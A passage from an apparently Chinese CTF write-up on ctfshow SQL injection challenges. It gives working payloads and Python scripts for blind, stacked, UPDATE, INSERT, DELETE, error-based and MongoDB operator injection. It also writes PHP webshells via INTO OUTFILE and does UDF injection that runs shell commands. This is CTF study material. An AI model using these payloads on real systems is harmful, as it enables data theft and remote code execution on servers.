27 time.sleep(0.2) 28 tail = mid 29 except requests.exceptions.Timeout: 30 time.sleep(0.2) 31 # 如果请求超时，说明当前位置字符的ASCII码大于中间值 32 head = mid + 1 33 except Exception as e: 34 time.sleep(0.2) 35 print(f\u0026#34;An unexpected error occurred: {e}\u0026#34;) 36 break 37 38 if head != 32: 39 # 如果找到有效的字符，将其添加到结果字符串中 40 result += chr(head) 41 else: 42 # 如果没有找到有效字符，退出循环 43 break 44 print(\u0026#34;[*]Result : \u0026#34;+result) web223 1查询语句 2 3 //分页查询 4 $sql = select * from ctfshow_user group by $username; 5 6返回逻辑 7 8//TODO:很安全，不需要过滤 9//用户名不能是数字 这题ban掉了数字\n用true来构造出数字即可\n这题一开始我想用时间盲注的，但是跑不出来，后面直接拿y4✌的布尔盲注跑了\n如下\n1import requests 2import time 3url = \u0026#34;http://14dc1900-f046-44e8-bfa2-e93fbc2a32b3.challenge.ctf.show/api/?u=\u0026#34; 4result = \u0026#34;\u0026#34; 5i = 0 6 7def createNum(n): 8 num = \u0026#39;true\u0026#39; 9 if n == 1: 10 return \u0026#39;true\u0026#39; 11 else: 12 for i in range(n - 1): 13 num += \u0026#34;+true\u0026#34; 14 return num 15 16while True: 17 i = i + 1 18 # ASCII码范围，32到127是可打印字符的范围 19 head = 32 20 tail = 127 21 22 while head \u0026lt; tail: 23 # 二分查找的中间值 24 mid = (head + tail) \u0026gt;\u0026gt; 1 25 26 # 查数据库-ctfshow_flagas 27 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 28 # 查字段-flagasabc 29 # payload = \u0026#34;select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagas\u0026#39;\u0026#34; 30 # 查flag 31 payload = \u0026#34;select flagasabc from ctfshow_flagas\u0026#34; 32 33 34 params = { 35 # \u0026#34;u\u0026#34;: f\u0026#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u0026gt;{createNum(mid)},sleep(true),true)\u0026#34; #时间盲注 （我没跑出来，不知道为啥 36 \u0026#34;u\u0026#34;: f\u0026#34;if(ascii(substr(({payload}),{createNum(i)},{createNum(1)}))\u0026gt;{createNum(mid)},username,\u0026#39;a\u0026#39;)\u0026#34; #布尔盲注 37 } 38 39 # try: 40 # r = requests.post(url,params=params,timeout=1) 41 # tail = mid 42 # except Exception as e: 43 # head = mid + 1 44 45 r = requests.get(url, params=params) 46 if \u0026#34;userAUTO\u0026#34; in r.text: 47 head = mid + 1 48 else: 49 tail = mid 50 51 if head != 32: 52 # 如果找到有效的字符，将其添加到结果字符串中 53 result += chr(head) 54 else: 55 # 如果没有找到有效字符，退出循环 56 break 57 58 print(result) 布尔盲注这么快，我为什么要想不开尝试时间盲注呢\nweb224 试了试万能密码，失败了\n访问/robots.txt\n发现有重置密码的路由\n修改密码之后登入，看到一个文件上传\nctfshow web224 sql_文件上传产生sql注入 详解_sql注入漏洞ctf文件上传-CSDN博客\n这是一道文件上传的sql注入题\n当文件上传时，后台会将文件名，文件路径，文件类型（文件头）直接与sql语句进行拼接\n所以我们可以构造一个恶意文件，将文件头改写成我们要拼接的sql语句，从而实现注入\n如图\npayload:\nC64File \u0026#34;\u0026#39;);select 0x3c3f3d60746163202f662a603f3e into outfile \u0026#39;/var/www/html/1.php\u0026#39;;--+ 新建文本，写入payload，改名为1.bin，上传文件，访问1.bin拿到flag\n堆叠注入 web225 没有过滤show\nusername=1\u0026#39;;show tables; 可以用handler读\npayload:\nusername=ctfshow\u0026#39;;show tables;handler ctfshow_flagasa open;handler ctfshow_flagasa read first; 1.handler ctfshow_flag as a open;\nHANDLER 语句是 MySQL 中用于直接操作表的一种特殊方式。此语句的作用是打开一个名为 ctfshow_flag 的表，并将其别名为 a。HANDLER 语句可以绕过一些常规的查询机制，直接访问表的数据，通常用于高效地获取数据。\n2.handler ctfshow_flag as a read first;\n该语句继续使用 HANDLER 来操作之前打开的 ctfshow_flag 表（别名 a），read first 表示读取表中的第一行数据。\n其他方法\nweb226 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //师傅说过滤的越多越好 9 if(preg_match(\u0026#39;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\\(/i\u0026#39;,$username)){ 10 die(json_encode($ret)); 11 } 这道题把show给waf掉了\n这题可以用预处理来打\n[SQL注入][强网杯 2019]随便注(三种姿势)-CSDN博客\n格式\nPREPARE name from \u0026#39;[my sql sequece]\u0026#39;; //预定义SQL语句 EXECUTE name; //执行预定义SQL语句 (DEALLOCATE || DROP) PREPARE name; //删除预定义SQL语句 我们可以先将要执行的语句转换成16进制后，作为预处理的sql语句传入，并执行\npayload\nusername=1\u0026#39;;PREPARE tables from 0x73686f77207461626c6573;EXECUTE tables; //show tables username=1\u0026#39;;PREPARE columns from 0x73656c6563742067726f75705f636f6e63617428636f6c756d6e5f6e616d65292066726f6d20696e666f726d6174696f6e5f736368656d612e636f6c756d6e73207768657265207461626c655f736368656d613d6461746162617365282920616e64207461626c655f6e616d653d2763746673685f6f775f666c6167617327;EXECUTE columns; //select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;ctfsh_ow_flagas\u0026#39; username=1\u0026#39;;PREPARE flag from 0x73656c65637420666c61676173622066726f6d2063746673685f6f775f666c61676173;EXECUTE flag; //select flagasb from ctfsh_ow_flagas //ctfshow{7d0038e7-cede-48cc-b0fb-307177d26890} web227 这道题没办法通过查表拿到flag\n这道题的payload是\n1\u0026#39;;call getFlag(); 就是执行getFlag函数拿到flag\n但问题是我们要怎么知道这个函数呢\n我们需要查看MySQL的存储过程，如下文\nMySQL——查看存储过程和函数_mysql 查询function-CSDN博客\nSELECT * FROM information_schema.Routines 通过预处理执行\nusername=1\u0026#39;;PREPARE Routines from 0x53454c454354202a2046524f4d20696e666f726d6174696f6e5f736368656d612e526f7574696e6573;EXECUTE Routines; 可以看到getFlag函数和flag\nweb228 查询语句 //分页查询 $sql = \u0026#34;select id,username,pass from ctfshow_user where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; $bansql = \u0026#34;select char from banlist;\u0026#34;; 返回逻辑 //师傅说内容太多，就写入数据库保存 if(count($banlist)\u0026gt;0){ foreach ($banlist as $char) { if(preg_match(\u0026#34;/\u0026#34;.$char.\u0026#34;/i\u0026#34;, $username)){ die(json_encode($ret)); } } } 同web226\nweb229 同web226\nweb230 同web226\nupdate注入 web231 查询语句 //分页查询 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 返回逻辑 //无过滤 知道update函数的作用之后就好理解了\n可以通过update函数更新ctfshow_user表中的内容\n利用update将查询结果写入表中\npassword=1\u0026#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1 查表名 password=1\u0026#39;,username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1 查列名 password=1\u0026#39;,username=(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flaga\u0026#39;) where 1=1#\u0026amp;username=1 得到flag password=1\u0026#39;,username=(select flagas from flaga) where 1=1#\u0026amp;username=1 原文链接：https://blog.csdn.net/solitudi/article/details/110144623 web232 查询语句 //分页查询 $sql = \u0026#34;update ctfshow_user set pass = md5(\u0026#39;{$password}\u0026#39;) where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 返回逻辑 //无过滤 同web231\npassword=1\u0026#39;),username=(select group_concat(table_name) from information_schema.tables where table_schema=database()) where 1=1#\u0026amp;username=1 password=1\u0026#39;),username=(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flagaa\u0026#39;) where 1=1#\u0026amp;username=1 password=1\u0026#39;),username=(select flagass from flagaa) where 1=1#\u0026amp;username=1 web233 查询语句 //分页查询 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 返回逻辑 //无过滤 这道题貌似waf掉了单引号，导致无法构造闭合，前面的方法用不了\n方法一 wp看到的骚操作\npayload\n#获取表名 password=\\\u0026amp;username=,username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23 #获取列名 password=\\\u0026amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_schema=database())%23 #获取数据 password=\\\u0026amp;username=,username=(select group_concat(flagass233) from flag233333) 方法二 ：盲注 1\u0026#34;\u0026#34;\u0026#34; 2Author:Y4tacker 3\u0026#34;\u0026#34;\u0026#34; 4import requests 5 6url = \u0026#34;http://4f5b7639-6d01-45c4-9610-e11239ba8c90.chall.ctf.show/api/?page=1\u0026amp;limit=10\u0026#34; 7 8result = \u0026#34;\u0026#34; 9i = 0 10 11while 1: 12 i = i + 1 13 head = 32 14 tail = 127 15 16 while head \u0026lt; tail: 17 mid = (head + tail) \u0026gt;\u0026gt; 1 18 # 查数据库 19 # payload = \u0026#34;select group_concat(table_name) from information_schema.tables where table_schema=database()\u0026#34; 20 # 查表名 21 # payload = \u0026#34;select column_name from information_schema.columns where table_name=\u0026#39;flag233333\u0026#39; limit 1,1\u0026#34; 22 # 查数据 23 payload = \u0026#34;select flagass233 from flag233333\u0026#34; 24 data = { 25 \u0026#39;username\u0026#39;: f\u0026#34;1\u0026#39; or if(ascii(substr(({payload}),{i},1))\u0026gt;{mid},sleep(0.05),1)#\u0026#34;, 26 \u0026#39;password\u0026#39;: \u0026#39;4\u0026#39; 27 } 28 try: 29 r = requests.post(url, data=data, timeout=0.9) 30 tail = mid 31 except Exception as e: 32 head = mid + 1 33 if head != 32: 34 result += chr(head) 35 else: 36 break 37 print(result) web234 查询语句 //分页查询 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 返回逻辑 //无过滤 同web233，用\\实现逃逸\nweb235 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤 or \u0026#39; or \u0026lsquo; 被禁导致information_schema.tables也被禁了\n导致我们没办法查询列\n这种情况涉及到一个知识点 ：CTF|mysql之无列名注入 - 知乎\n在 information_schema 中，除了 SCHEMATA、TABLES、COLUMNS 有表信息外，高版本的 mysql 中，还有 INNODB_TABLES 及 INNODB_COLUMNS 中记录着表结构。\n读表\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026amp;password=\\ 查字段\nusername=,username=(select b from (select 1,2 as b,3 union select * from flag23a1 limit 1,1)a)#\u0026amp;password=\\ web236 1查询语句 2 3 //分页查询 4 $sql = \u0026#34;update ctfshow_user set pass = \u0026#39;{$password}\u0026#39; where username = \u0026#39;{$username}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤 or \u0026#39; flag 读表\nusername=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#\u0026amp;password=\\ //banlist,ctfshow_user,flaga 读字段\nusername=,username=(select b from (select 1,2 as b,3 union select * from flaga limit 1,1)a)#\u0026amp;password=\\ 这题新增的flag过滤，但是实际上没有影响，或许是过滤返回的内容？\ninsert注入 web237 1查询语句 2 3 //插入数据 4 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 5 6返回逻辑 7 8 //无过滤 insert函数用于插入值\n其实跟update注入差不多\npayload:\n读表名\npassword=1\u0026amp;username=1\u0026#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()));# 查列名\npassword=1\u0026amp;username=1\u0026#39;,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;));# //id,flagass23s3,info 爆字段\npassword=1\u0026amp;username=1\u0026#39;,(select flagass23s3 from flag));# web238 1查询语句 2 3 //插入数据 4 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 5 6返回逻辑 7 8 //过滤空格 测了一下发现不止是空格，连同一些代替空格的字符也被一同waf了，比如/**/\n我们可以考虑用括号代替空格\npayload\n#获取表名 username=1\u0026#39;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))%23\u0026amp;password=1 #获取列名 username=1\u0026#39;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;flagb\u0026#39;)))%23\u0026amp;password=1 #获取数据 username=1\u0026#39;,(select(group_concat(flag))from(flagb)))%23\u0026amp;password=1 web239 查询语句 //插入数据 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 返回逻辑 //过滤空格 or payload:\n读表\nusername=1\u0026#39;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#\u0026amp;password=1 由于*被ban掉了，没办法用之前无列名爆字段的方法\n这里猜测列名为flag，直接读\nusername=1\u0026#39;,(select(flag)from(flagbb)))#\u0026amp;password=1 web240 Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写 查询语句 //插入数据 $sql = \u0026#34;insert into ctfshow_user(username,pass) value(\u0026#39;{$username}\u0026#39;,\u0026#39;{$password}\u0026#39;);\u0026#34;; 返回逻辑 //过滤空格 or sys mysql 根据hint可以知道是要爆破表名\n拿y4✌的脚本改一下\n\u0026#34;\u0026#34;\u0026#34; Author:Y4tacker \u0026#34;\u0026#34;\u0026#34; import random import requests url = \u0026#34;http://0a7a5c02-0a05-4efe-86f5-fcf36464cc74.challenge.ctf.show\u0026#34; url_insert = url + \u0026#34;/api/insert.php\u0026#34; url_flag = url + \u0026#34;/api/?page=1\u0026amp;limit=1000\u0026#34; # 看命函数 def generate_random_str(): sttr = \u0026#39;ab\u0026#39; str_list = [random.choice(sttr) for i in range(5)] random_str = \u0026#39;\u0026#39;.join(str_list) return random_str while 1: data = { \u0026#39;username\u0026#39;: f\u0026#34;1\u0026#39;,(select(flag)from(flag{generate_random_str()})))#\u0026#34;, \u0026#39;password\u0026#39;: \u0026#34;\u0026#34; } r = requests.post(url_insert, data=data) r2 = requests.get(url_flag) if \u0026#34;ctfshow{\u0026#34; in r2.text: for i in r2.json()[\u0026#39;data\u0026#39;]: if \u0026#34;ctfshow{\u0026#34; in i[\u0026#39;pass\u0026#39;]: print(i[\u0026#39;pass\u0026#39;]) break break web241 sql语句 //删除记录 $sql = \u0026#34;delete from ctfshow_user where id = {$id}\u0026#34;; 返回逻辑 //无过滤 delete注入，delete函数顾名思义就是从数据库中删除内容\n注入点在where后面，可以采用时间盲注或者布尔盲注，但是由于delete会删除数据库中的记录，所以可能会出现记录都删完了但是flag还没注出来的情况\n1import requests 2import time 3url = \u0026#39;http://40c66eef-72b4-4b08-88d0-87bef44b640e.challenge.ctf.show/api/delete.php\u0026#39; 4str = \u0026#39;\u0026#39; 5for i in range(1, 60): 6 min,max = 32, 128 7 while True: 8 j = min + (max-min)//2 9 if(min == j): 10 str += chr(j) 11 print(str) 12 break 13 # 爆表名 14 # payload = { 15 # \u0026#39;id\u0026#39;: f\u0026#39;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#39; 16 # } 17 # 爆列 18 # payload = { 19 # \u0026#39;id\u0026#39;: f\u0026#34;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#34; 20 # } 21 # 爆值 22 payload = { 23 \u0026#39;id\u0026#39;: f\u0026#34;if(ascii(substr((select group_concat(flag) from flag),{i},1))\u0026lt;{j},sleep(0.03),1)#\u0026#34; 24 } 25 start_time = time.time() 26 r = requests.post(url=url, data=payload).text 27 end_time = time.time() 28 sub = end_time - start_time 29 if sub \u0026gt;= 0.2: 30 max = j 31 else: 32 min = j 为什么sleep设定的是0.03，但是超时时间是大于0.2呢\n那是因为要对所有记录都算一遍 if\n那我们怎么测试这个时间呢，这里放一个大佬的脚本\nPractice - CTFSHOW WEB入门 SQL注入篇\nurl = \u0026#39;http://58e7b03f-3c20-48e0-a8f8-9a3efa102f6d.challenge.ctf.show:8080/api/delete.php\u0026#39; def test2() -\u0026gt; float: rand = random.random() time_s = time.time() _ = requests.post(url,data={\u0026#34;id\u0026#34;: f\u0026#34;if({1 if rand \u0026gt; 0.5 else 0},sleep(0.05),0)\u0026#34;}) time_e = time.time() return (rand \u0026gt; 0.5, time_e - time_s) print([test() for _ in range(30)]) 我测出来的结果\n[(False, 0.09313225746154785), (True, 1.087439775466919), (True, 1.599609375), (True, 1.6065845489501953), (True, 1.6024441719055176), (False, 0.5998048782348633), (False, 0.0730128288269043), (True, 1.0801937580108643), (True, 1.6085357666015625), (False, 0.1298365592956543), (True, 1.089057445526123), (False, 0.6771323680877686), (True, 1.0864779949188232), (True, 1.6023609638214111), (False, 0.07814288139343262), (False, 0.07692098617553711), (False, 0.07593393325805664), (True, 1.082731008529663), (False, 0.07544946670532227), (True, 1.606881856918335), (True, 1.609898567199707), (False, 0.08498406410217285), (True, 1.0778491497039795), (True, 1.0797111988067627), (True, 1.0858359336853027), (False, 0.08560538291931152), (False, 0.08359408378601074), (False, 0.08201932907104492), (False, 0.07815837860107422), (True, 1.085575819015503)] 在false和true之间选取一个合适的值即可，目的是能够进行区分，我这里选取了0.2\n文件注入 web242 1sql语句 2 3 //备份表 4 $sql = \u0026#34;select * from ctfshow_user into outfile \u0026#39;/var/www/html/dump/{$filename}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 outfile的语法 SELECT ... INTO OUTFILE \u0026#39;file_name\u0026#39; [CHARACTER SET charset_name] [export_options] export_options: [{FIELDS | COLUMNS} [TERMINATED BY \u0026#39;string\u0026#39;]//分隔符 [[OPTIONALLY] ENCLOSED BY \u0026#39;char\u0026#39;] [ESCAPED BY \u0026#39;char\u0026#39;] ] [LINES [STARTING BY \u0026#39;string\u0026#39;] [TERMINATED BY \u0026#39;string\u0026#39;] ] ---------------------------------------------------- “OPTION”参数为可选参数选项，其可能的取值有： FIELDS TERMINATED BY \u0026#39;字符串\u0026#39;：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\\t”。 FIELDS ENCLOSED BY \u0026#39;字符\u0026#39;：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。 FIELDS OPTIONALLY ENCLOSED BY \u0026#39;字符\u0026#39;：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。 FIELDS ESCAPED BY \u0026#39;字符\u0026#39;：设置转义字符，只能为单个字符。默认值为“\\”。 LINES STARTING BY \u0026#39;字符串\u0026#39;：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。 LINES TERMINATED BY \u0026#39;字符串\u0026#39;：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\\n”。 漏洞的注入点是由于数据库的导出功能\n根据这个我们可以写入一句话木马\npayload:\nfilename=1.php\u0026#39; LINES STARTING BY \u0026#39;\u0026lt;?php eval($_POST[1]);?\u0026gt;\u0026#39;# web243 1sql语句 2 3 //备份表 4 $sql = \u0026#34;select * from ctfshow_user into outfile \u0026#39;/var/www/html/dump/{$filename}\u0026#39;;\u0026#34;; 5 6返回逻辑 7 8 //过滤了php 尝试一下.user.ini文件包含\nfilename=.user.ini\u0026#39; lines starting by \u0026#39;auto_prepend_file=1.txt\\n\u0026#39;%23 filename=1.txt\u0026#39; lines starting by \u0026#39;\u0026lt;?=eval($_POST[1])?\u0026gt;\u0026#39;%23 报错注入 新手小白入门——SQL注入之报错注入_sql注入报错注入-CSDN博客\nweb244 sql语句 //备份表 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 返回逻辑 //无过滤 updatexml报错注入\npayload\n/api/?id=\u0026#39; or updatexml(1, concat(0x7e, database(), 0x7e), 1)%23 /api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select table_name from information_schema.tables where table_schema = database() limit 1, 1), 0x7e), 1)%23 /api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = \u0026#39;ctfshow_flag\u0026#39; limit 1, 1), 0x7e), 1)%23 /api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select column_name from information_schema.columns where table_schema = database() and table_name = \u0026#39;ctfshow_flag\u0026#39; limit 1, 1), 0x7e), 1)%23 /api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select substr(flag, 1, 30) from ctfshow_flag), 0x7e), 1)%23 #ctfshow{89982b11-5c7d-4215-a78 /api/?id=\u0026#39; or updatexml(1, concat(0x7e, (select substr(flag, 31, 30) from ctfshow_flag), 0x7e), 1)%23 #9-a9f8ecc8f1b1} # 数据长度有限制，可以使用substr来截取 //ctfshow{89982b11-5c7d-4215-a789-a9f8ecc8f1b1} web245 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue报错注入\npayload\n查数据库名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select database()))))%23 爆表名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))%23 //ctfshow_flagsa 爆字段名：id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\u0026#34;ctfshow_flagsa\u0026#34;))))%23 //flag1 爆数据： id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),1,30) from ctfshow_flagsa))))%23 id=\u0026#39; and (select extractvalue(1,concat(0x7e,(select substr(group_concat(flag1),31,30) from ctfshow_flagsa))))%23 //ctfshow{41446106-c47e-434d-a0c0-16ee43375249} web246 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue floor报错注入\n原理：SQL注入报错注入之floor()报错注入原理分析_sql注入floor-CSDN博客\n#获取表名 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23 #获取列名 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flags\u0026#39; limit 1,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23 #获取数据 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (flag2) from ctfshow_flags limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a%23 web247 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤 9 过滤updatexml extractvalue floor 这道题floor函数也被ban掉了\n根据floor报错注入的原理，其实我们可以知道，之所以会出现错误主要是因为用floor对rand(0)*2进行取整，目的输出011011\u0026hellip;的结果，而既然这样我们只需要找一个同样能进行取整的函数来代替floor就ok了\n除了floor之外，我们还能使用round，ceil等\npayload\n查表 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (table_name) from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23 查列 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (column_name) from information_schema.columns where table_name=\u0026#39;ctfshow_flagsa\u0026#39; limit 1,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23 查数据 1\u0026#39; union select 1,count(*),concat(0x3a,0x3a,(select (`flag?`) from ctfshow_flagsa limit 0,1),0x3a,0x3a,ceil(rand(0)*2))a from information_schema.columns group by a%23 web248 1sql语句 2 3 4 $sql = \u0026#34;select id,username,pass from ctfshow_user where id = \u0026#39;\u0026#34;.$id.\u0026#34;\u0026#39; limit 1;\u0026#34;; 5 6返回逻辑 7 8 //无过滤, UDF注入\nctfshow-web入门-sql注入-web248-UDF 注入_ctfshow web248-CSDN博客\n我们需要将 UDF 的动态链接库文件（xxx.dll文件）放到 MySQL 的检索目录下才能创建自定义函数，对于不同版本的 mysql，检索目录是不同的：\nMySQL \u0026lt; 5.0\t导出路径随意； 5.0 \u0026lt;= MySQL\u0026lt; 5.1\t需要导出至目标服务器的系统目录（如：c:/windows/system32/） 5.1 \u0026lt; MySQL\t必须导出到MySQL安装目录下的lib\\plugin文件夹下\n堆叠注入查版本\n/api/?id=0\u0026#39;;select version();%23 大于5.1，接着要查目录路径\n/api/?id=0\u0026#39;;select @@plugin_dir;%23 /usr/lib/mariadb/plugin 拿到路径，我们接下来就可以传入我们的恶意so文件了\nsqlmap中有已经写好的 udf 文件\n如，lib_mysqludf_sys_64.so\n但是由于get传参有长度限制，我们需要进行分段传参\n放一个国外大佬的脚本，将udf文件分段上传后再进行合并即可\nimport requests url=\u0026#34;http://449c0852-2873-4a47-9eb4-a854915a6b40.challenge.ctf.show/api/\u0026#34; udf=\u0026#34;\u0026#34; udfs=[] for i in range(0,len(udf),5000): udfs.append(udf[i:i+5000]) #写入多个文件中 for i in udfs: url1=url+f\u0026#34;?id=1\u0026#39;;SELECT \u0026#39;{i}\u0026#39; into dumpfile \u0026#39;/tmp/\u0026#34;+str(udfs.index(i))+\u0026#34;.txt\u0026#39;%23\u0026#34; requests.get(url1) #合并文件生成so文件 url2=url+\u0026#34;?id=1\u0026#39;;SELECT unhex(concat(load_file(\u0026#39;/tmp/0.txt\u0026#39;),load_file(\u0026#39;/tmp/1.txt\u0026#39;),load_file(\u0026#39;/tmp/2.txt\u0026#39;),load_file(\u0026#39;/tmp/3.txt\u0026#39;))) into dumpfile \u0026#39;/usr/lib/mariadb/plugin/hack.so\u0026#39;%23\u0026#34; requests.get(url2) #创建自定义函数并执行恶意命令 requests.get(url+\u0026#34;?id=1\u0026#39;;create function sys_eval returns string soname \u0026#39;hack.so\u0026#39;%23\u0026#34;) r=requests.get(url+\u0026#34;?id=1\u0026#39;;select sys_eval(\u0026#39;cat /f*\u0026#39;)%23\u0026#34;) print(r.text) web249 1sql语句 2 3 //无 4 $user = $memcache-\u0026gt;get($id); 5 6返回逻辑 7 8 //无过滤 payload:\n?id[]=flag web250 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } ctfshow-web入门-sql注入（web249-web253）nosql 注入_ctfshow web250-CSDN博客\n在这些操作符中，$ne 就是我们在重言式注入中需要利用到的那个，它的作用是将不等于指定值的数据都查询出来，比如 $ne=1 时就是将所有不等于 1 的数据都查询出来。\n所以payload就是\nusername[$ne]=1\u0026amp;password[$ne]=1 环境好像有点问题（？）前两次一直查不出来\nweb251 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 同样是\nusername[$ne]=1\u0026amp;password[$ne]=1 继续用上一题的 payload，返回 admin 的密码，但是这次的密码里没有 flag\n可能flag在其他用户的密码里，我们禁用admin\nusername[$ne]=admin\u0026amp;password[$ne]=1 拿到flag\nweb252 1sql语句 2 3 $query = new MongoDB\\Driver\\Query($data); 4 $cursor = $manager-\u0026gt;executeQuery(\u0026#39;ctfshow.ctfshow_user\u0026#39;, $query)-\u0026gt;toArray(); 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 13 这题有很多不同的username\n我们可以考虑采用正则匹配来筛选\nusername[$ne]=1\u0026amp;password[$regex]=ctfshow{ or\n用$gt （大于）一直尝试知道拿到有flag的用户\nusername[$ne]=admin\u0026amp;password[$ne]=1 username[$gt]=admin1\u0026amp;password[$ne]=1 username[$gt]=admin2\u0026amp;password[$ne]=1 username[$gt]=admin3\u0026amp;password[$ne]=1 or\n正则匹配去掉所有为admin开头的用户\nusername[$regex]=^[^admin].*$\u0026amp;password[$ne]=1 web253 1sql语句 2 3 //sql 4 db.ctfshow_user.find({username:\u0026#39;$username\u0026#39;,password:\u0026#39;$password\u0026#39;}).pretty() 5 6返回逻辑 7 8 //无过滤 9 if(count($cursor)\u0026gt;0){ 10 $ret[\u0026#39;msg\u0026#39;]=\u0026#39;登陆成功\u0026#39;; 11 array_push($ret[\u0026#39;data\u0026#39;], $flag); 12 } 方法一 CTFSHOW WEB入门 